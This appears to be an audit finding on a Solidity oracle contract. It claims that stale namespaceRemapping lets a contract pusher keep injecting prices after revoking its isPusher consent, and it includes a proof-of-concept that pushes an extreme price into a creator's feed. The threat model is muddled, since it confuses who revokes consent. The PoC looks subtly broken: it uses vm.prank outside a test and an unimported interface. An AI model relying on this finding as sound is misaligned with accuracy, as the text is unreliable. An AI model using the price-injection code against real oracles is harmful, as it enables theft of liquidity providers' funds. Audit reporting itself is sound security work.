### Title
Stale `namespaceRemapping` Persists After Contract-Pusher Consent Is Revoked at the Source — (`File: smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol`)

---

### Summary

`allowContractPushers` verifies consent via a one-time `isPusher(creator)` staticcall and permanently writes `namespaceRemapping[pusher] = creator`. The push path (`fallback`) never re-checks `isPusher`. If the contract pusher later revokes consent at its own level (making `isPusher` return `false`), the oracle mapping persists and the pusher can still inject arbitrary prices into the creator's namespace.

---

### Finding Description

`allowContractPushers` is documented as using a **live** `isPusher(creator)` staticcall as the ongoing consent mechanism, explicitly replacing the need for a deadline or signature:

> *"consent is proven by a LIVE `isPusher(creator)` staticcall instead of a signature, so there is nothing to replay and no deadline is needed."* [1](#0-0) 

However, the check is performed **only once** at registration time:

```solidity
(bool ok, bytes memory res) = pusher.staticcall(abi.encodeWithSignature("isPusher(address)", msg.sender));
require(ok);
bool allowed = abi.decode(res, (bool));
require(allowed);

namespaceRemapping[pusher] = msg.sender;   // ← permanent write
``` [2](#0-1) 

The `fallback` push path reads `namespaceRemapping` without any re-verification of `isPusher`:

```solidity
address creator = namespaceRemapping[msg.sender];
if (creator == address(0)) creator = msg.sender;
``` [3](#0-2) 

This means the permission is **permanent** until the creator separately calls `removePushers` on the oracle — exactly the same pattern as the referenced bug (whitelisting that persists unless manually revoked). A creator who revokes consent at the pusher-contract level (e.g., upgrades the contract so `isPusher` returns `false`, or the contract is taken over) will believe the delegation is gone, but the oracle mapping remains active.

---

### Impact Explanation

A compromised or upgraded contract pusher retains the ability to call the oracle's `fallback` and write arbitrary slot words into the creator's namespace. Those slot words encode `U64x32` prices and `Codebook256` spread indexes that are consumed directly by `AnchoredPriceProvider` / `PriceProvider` and ultimately by pool swaps. Bad prices (stale, inverted, or unbounded) reaching the pool constitute a **bad-price execution** impact: traders receive more than the oracle curve permits or the pool fails to receive owed input, causing direct loss of LP principal. [4](#0-3) 

---

### Likelihood Explanation

The scenario requires:
1. A creator to have previously called `allowContractPushers` for an upgradeable or externally-controlled contract pusher.
2. That pusher contract to be compromised or upgraded so `isPusher` returns `false` — while the creator believes the delegation is revoked.
3. The creator to not separately call `removePushers` on the oracle (a reasonable omission given the comment implies the live check is the ongoing guard).

This is a realistic operational scenario for any protocol that uses upgradeable contract pushers, and the misleading natspec comment increases the probability that creators will not perform the manual oracle-side revocation.

---

### Recommendation

Re-verify `isPusher(creator)` inside the `fallback` push path before routing into a delegated namespace, or remove the misleading claim that the live check replaces a deadline. Concretely:

```solidity
// In fallback(), after resolving creator from namespaceRemapping:
if (creator != address(0) && creator != msg.sender) {
    (bool ok, bytes memory res) = msg.sender.staticcall(
        abi.encodeWithSignature("isPusher(address)", creator)
    );
    if (!ok || !abi.decode(res, (bool))) {
        // consent revoked at source — clear stale mapping and fall back to own namespace
        namespaceRemapping[msg.sender] = address(0);
        creator = msg.sender;
    }
}
```

Alternatively, remove the `allowContractPushers` path entirely and require contract pushers to use the signed `allowPushers` path with a deadline, which is the pattern that correctly bounds the permission lifetime.

---

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import {CompressedOracleV1} from ".../CompressedOracle.sol";

/// Upgradeable pusher: starts consenting, then revokes at contract level.
contract UpgradeablePusher {
    bool public consent = true;
    function isPusher(address) external view returns (bool) { return consent; }
    function revokeConsent() external { consent = false; }

    // Attacker-controlled push after "revocation"
    function maliciousPush(address oracle, bytes calldata payload) external {
        (bool ok,) = oracle.call(payload);
        require(ok);
    }
}

contract PoC {
    function run(CompressedOracleV1 oracle, address creator) external {
        UpgradeablePusher pusher = new UpgradeablePusher();

        // Step 1: creator registers the contract pusher (isPusher returns true)
        address[] memory arr = new address[](1);
        arr[0] = address(pusher);
        vm.prank(creator);
        oracle.allowContractPushers(arr);

        // Step 2: pusher revokes consent at its own level
        pusher.revokeConsent();
        // isPusher(creator) now returns false — creator believes delegation is gone

        // Step 3: namespaceRemapping still maps pusher → creator
        assert(oracle.namespaceRemapping(address(pusher)) == creator);

        // Step 4: pusher injects a manipulated price into creator's namespace
        // (craft a slot word with an extreme price and valid timestamp)
        uint56 tsMs = uint56(block.timestamp * 1000);
        uint48 badRaw = (uint48(0xFFFFFF) << 16) | (uint48(0) << 8) | uint48(0); // max price, zero spread
        uint256 word = (uint256(tsMs) << 8) | uint256(0); // slotId=0
        word |= uint256(badRaw) << 208;
        bytes memory payload = abi.encodePacked(word);

        pusher.maliciousPush(address(oracle), payload);

        // Bad price now lives in creator's feed, consumed by pools
        bytes32 feedId = oracle.feedIdOf(creator, 0, 0);
        IOffchainOracle.OracleData memory data = oracle.getOracleData(feedId);
        assert(data.price > 0); // manipulated price accepted
    }
}
``` [5](#0-4) [4](#0-3)

### Citations

**File:** smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol (L214-216)
```text
    /// @notice Contract-pusher variant: consent is proven by a LIVE `isPusher(creator)`
    ///         staticcall instead of a signature, so there is nothing to replay and no
    ///         deadline is needed.
```

**File:** smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol (L217-234)
```text
    function allowContractPushers(address[] calldata pushers) external {
        uint256 l = pushers.length;
        for (uint256 i; i < l; i++) {
            address pusher = pushers[i];

            if (pusher == msg.sender) {
                revert NoSelfRemapping();
            }

            (bool ok, bytes memory res) = pusher.staticcall(abi.encodeWithSignature("isPusher(address)", msg.sender));
            require(ok);
            bool allowed = abi.decode(res, (bool));
            require(allowed);

            namespaceRemapping[pusher] = msg.sender;
            emit PusherAuthorized(pusher, msg.sender);
        }
    }
```

**File:** smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol (L311-344)
```text
    fallback() override external {
        uint256 end;
        uint256 namespace;

        address creator = namespaceRemapping[msg.sender];
        if (creator == address(0)) creator = msg.sender;

        assembly ("memory-safe") {
            end := calldatasize()
            namespace := shl(96, creator) // [creator:20][zeros:12]
        }

        // 4 * 6 + 7 + 1 = 32 bytes per slot
        if (end == 0 || end % 32 != 0) revert BadCalldataLength();

        for (uint256 ptr = 0; ptr < end; ptr += 32) {
            uint256 word;
            assembly ("memory-safe") {
                word := calldataload(ptr)
            }
            // casting to 'uint8' is safe we want LSB
            // forge-lint: disable-next-line(unsafe-typecast)
            uint8 slotId = uint8(word);
            TimeMs timestampMs = toTimeMs(word >> 8 & X56);
            timestampMs.revertIfAfterBlockTimeWithDrift(MAX_TIME_DRIFT);
            bytes32 key = bytes32(namespace | uint256(slotId));
            uint256 old = uint256(_loadStorage(key));
            TimeMs oldTimestampMs = toTimeMs(old >> 8 & X56);

            bool newer = timestampMs.isAfter(oldTimestampMs);
            if (!newer) continue;

            _writeStorage(key, bytes32(bytes32(word & ~uint256(0xff))));
        }
```
